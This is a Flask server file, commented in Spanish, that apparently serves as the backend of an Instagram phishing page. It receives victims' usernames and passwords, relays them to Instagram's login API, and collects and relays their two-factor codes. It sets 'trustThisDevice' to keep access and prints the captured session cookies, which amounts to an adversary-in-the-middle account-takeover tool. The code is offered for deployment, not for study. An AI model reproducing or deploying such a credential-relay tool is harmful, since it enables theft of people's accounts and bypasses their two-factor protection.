# app.py

import os
import json
import requests
from flask import Flask, request, jsonify, redirect, session
from werkzeug.datastructures import Headers

# --- CONFIGURACIÓN DE SEGURIDAD Y APLICACIÓN ---
app = Flask(__name__)
# ¡IMPORTANTE! Genera una clave segura para las sesiones de Flask
# Puedes usar: os.urandom(24) para generar una
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'SUPER_SECRETO_Y_SEGURO_CAMBIAR_ESTO')

# El identificador de la API de Instagram para el inicio de sesión
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
INSTAGRAM_LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
INSTAGRAM_2FA_URL = 'https://www.instagram.com/accounts/login/ajax/two_factor/'

# --- SIMULACIÓN DE BASE DE DATOS/ALMACENAMIENTO ---
# En producción, usarías una BD real (PostgreSQL, SQLite, etc.).
# Para este ejemplo, usaremos un diccionario en memoria (NO PERSISTENTE)
# para relacionar un ID temporal con los datos del usuario.
# Estructura: {session_id: {'username': ..., 'password': ..., 'session': requests.Session()}}
TEMP_SESSION_STORAGE = {}

# --- UTILIDAD: SIMULAR ENCABEZADOS DE NAVEGADOR ---
def get_session_headers(session):
    """Genera los encabezados necesarios para Instagram, incluyendo el CSRF token."""
    # CSRF token debe estar presente, generalmente lo toma del cookie 'csrftoken'
    csrf_token = session.cookies.get('csrftoken')
    return {
        'User-Agent': USER_AGENT,
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': csrf_token,
        'Referer': 'https://www.instagram.com/'
    }

# ----------------------------------------------------------------------
# ENDPOINT 1: RECEPCIÓN DE IDENTIFICADOR Y CONTRASEÑA (PASO 1)
# ----------------------------------------------------------------------
@app.route('/api/login-step1', methods=['POST'])
def handle_step1():
    """Recibe credenciales e intenta iniciar sesión en Instagram."""
    data = request.json
    username = data.get('identifier')
    password = data.get('password')

    if not username or not password:
        return jsonify({"success": False, "message": "Datos faltantes"}), 400

    # 1. Prepara una nueva sesión de Requests para este usuario
    s = requests.Session()
    
    # Intenta obtener el token CSRF inicial visitando la página de inicio
    try:
        s.get('https://www.instagram.com/', headers={'User-Agent': USER_AGENT})
    except requests.exceptions.RequestException as e:
        print(f"Error al obtener CSRF token: {e}")
        return jsonify({"success": False, "redirect_step": 0, "message": "Error de conexión con Instagram"}), 500

    # 2. Payload para el inicio de sesión
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM:0:{int(request.date)}:{password}', # Formato simulado de contraseña
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    # 3. Envía la solicitud de inicio de sesión a Instagram
    try:
        response = s.post(
            INSTAGRAM_LOGIN_URL,
            data=payload,
            headers=get_session_headers(s)
        )
        res_json = response.json()
        print(f"Respuesta de Instagram (Paso 1): {res_json}")

    except requests.exceptions.RequestException:
        return jsonify({"success": False, "redirect_step": 0, "message": "Error de red al contactar Instagram."}), 500

    # 4. Analiza la respuesta de Instagram
    if res_json.get('two_factor_required'):
        # --- CASO A: 2FA REQUERIDO ---
        # Guarda la sesión y los datos para el siguiente paso
        temp_id = os.urandom(16).hex()
        TEMP_SESSION_STORAGE[temp_id] = {
            'username': username,
            'password': password,
            'session': s,
            'two_factor_identifier': res_json.get('two_factor_info', {}).get('two_factor_identifier')
        }
        
        # Devuelve el ID temporal al cliente para que lo use en el Paso 2 (código)
        return jsonify({
            "success": True, 
            "redirect_step": 3, # Indica al cliente que vaya directamente al paso 3 (código)
            "temp_id": temp_id
        })
        
    elif res_json.get('authenticated'):
        # --- CASO B: INICIO DE SESIÓN DIRECTO (Sin 2FA) ---
        
        # Las cookies de sesión final están en 's.cookies'
        final_cookies = s.cookies.get_dict()
        
        # Aquí guardarías las cookies finalizadas en tu BD
        print("✅ ÉXITO: Sesión capturada (Sin 2FA). Cookies:", final_cookies)
        
        # Enviar respuesta de éxito al cliente para redirigir a Instagram
        return jsonify({
            "success": True, 
            "redirect_step": 99, # Redirección final
            "message": "Autenticación directa exitosa"
        })
        
    else:
        # --- CASO C: FALLO DE CREDENCIALES/OTROS ERRORES ---
        # Redirige de vuelta al Paso 1 (simulando un error de login)
        return jsonify({
            "success": False, 
            "redirect_step": 1, 
            "message": "Login fallido. Usuario o contraseña incorrectos."
        })


# ----------------------------------------------------------------------
# ENDPOINT 2: RECEPCIÓN DEL CÓDIGO 2FA (PASO 3)
# ----------------------------------------------------------------------
@app.route('/api/login-step2', methods=['POST'])
def handle_step2():
    """Recibe el código 2FA y finaliza la autenticación."""
    data = request.json
    temp_id = data.get('temp_id')
    verification_code = data.get('verification_code')

    # 1. Valida los datos y recupera la sesión temporal
    if not temp_id or not verification_code or temp_id not in TEMP_SESSION_STORAGE:
        return jsonify({"success": False, "message": "Faltan datos o ID temporal inválido"}), 400

    temp_data = TEMP_SESSION_STORAGE[temp_id]
    s = temp_data['session']
    two_factor_identifier = temp_data['two_factor_identifier']

    # 2. Payload para el 2FA
    payload_2fa = {
        'username': temp_data['username'],
        'verificationCode': verification_code,
        'two_factor_identifier': two_factor_identifier,
        'trustThisDevice': 'true' # Esto es clave para capturar la sesión sin 2FA futuro
    }

    # 3. Envía la solicitud 2FA a Instagram
    try:
        response = s.post(
            INSTAGRAM_2FA_URL,
            data=payload_2fa,
            headers=get_session_headers(s)
        )
        res_json = response.json()
        print(f"Respuesta de Instagram (Paso 3/2FA): {res_json}")

    except requests.exceptions.RequestException:
        return jsonify({"success": False, "redirect_step": 3, "message": "Error de red al contactar Instagram."}), 500

    # 4. Analiza la respuesta de 2FA
    if res_json.get('authenticated'):
        # --- CASO A: 2FA CORRECTO Y SESIÓN CAPTURADA ---
        
        # Las cookies de sesión final están en 's.cookies'
        final_cookies = s.cookies.get_dict()
        
        # Aquí guardarías las cookies finalizadas en tu BD, asociadas al username
        print("✅ ÉXITO: Sesión capturada (Con 2FA). Cookies:", final_cookies)
        
        # 5. Limpieza y respuesta al cliente
        del TEMP_SESSION_STORAGE[temp_id] 
        return jsonify({
            "success": True, 
            "redirect_step": 99, # Redirección final
            "message": "Autenticación 2FA exitosa. Redirigiendo."
        })
    else:
        # --- CASO B: CÓDIGO 2FA INCORRECTO ---
        return jsonify({
            "success": False, 
            "redirect_step": 3, 
            "message": "Código de verificación incorrecto. Intenta de nuevo."
        })

if __name__ == '__main__':
    # Para pruebas locales. En Render/producción se ejecuta con Gunicorn.
    app.run(host='0.0.0.0', port=5000)
